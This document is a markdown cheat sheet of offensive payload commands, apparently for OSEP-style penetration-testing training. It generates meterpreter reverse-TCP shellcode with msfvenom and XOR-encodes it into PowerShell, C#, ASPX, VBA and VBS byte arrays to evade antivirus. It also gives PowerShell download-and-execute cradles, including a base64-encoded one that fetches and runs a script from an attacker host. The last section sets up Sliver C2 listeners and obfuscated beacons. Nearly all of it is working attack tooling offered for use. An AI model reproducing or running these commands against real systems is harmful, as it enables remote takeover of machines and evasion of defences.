# Payloads

Use with https://github.com/Anon-Exploiter/sliver-cheatsheet/tree/main/payloads

## XOR Encryption

### 1) x64bit shell

    sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw -o /home/kali/OSEP/hav0c/sliver.x64.bin

### 2) Powershell

    sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw | xxd -ps -c 1 | python3 -c 'import sys; key = 2; print("[Byte[]] $buf = " + ",".join([f"0x{(int(x, 16) ^ key):02X}" for x in sys.stdin.read().split()]))'

### 3) C#

    sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); encrypted = bytes([b ^ key for b in data]); print(f"byte[] buf = new byte[{len(encrypted)}] {{ " + ", ".join([f"0x{b:02X}" for b in encrypted]) + " };")'

### 4) ASPX 

    sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); encrypted = bytes([b ^ key for b in data]); print(f"byte[] vL8fwOy_ = new byte[{len(encrypted)}] {{ " + ",".join([f"0x{b:02X}" for b in encrypted]) + " };")'

### 5) Visual Basic - XOR

    payload="cv2.docm"
    python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char in payload))"
    
    payload="powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://10.10.10.11/hav0c-ps.txt'))"
    python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char in payload))"

### 6) Powershell Session

    echo -en "(New-Object System.Net.WebClient).DownloadString('http://10.10.10.11/hav0c-ps.txt') | IEX" | iconv -t UTF-16LE | base64 -w 0
    powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==

### 7) x32bit shell

    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5553 EXITFUNC=thread -f raw -o /home/kali/OSEP/hav0c/sliver.x86.bin

### 8) Visual Basic Script (VBS)

    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5553 EXITFUNC=thread -f raw | xxd -ps -c 1 | python3 -c 'import sys; key = 2; data = [str(int(x, 16) ^ key) for x in sys.stdin.read().split()]; chunk_size = 50; chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]; print("buf = Array(", end=""); print(", _\n".join([", ".join(chunk) for chunk in chunks]) + ")")'

### 9) Powershell 2

    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5553 EXITFUNC=thread -f raw | xxd -ps -c 1 | python3 -c 'import sys; key = 2; print("[Byte[]] $buf = " + ",".join([f"0x{(int(x, 16) ^ key):02X}" for x in sys.stdin.read().split()]))'

## Sliver Implant

### 1) Create listener

    profiles new --http 10.10.10.11:8088 --format shellcode osep
    http -L 10.10.10.11 --lport 8088

### 2) Generate beacon

    generate beacon --http 10.10.250.10:8088 --name sliver.obfuscated --os windows --seconds 5 --jitter 0 --evasion
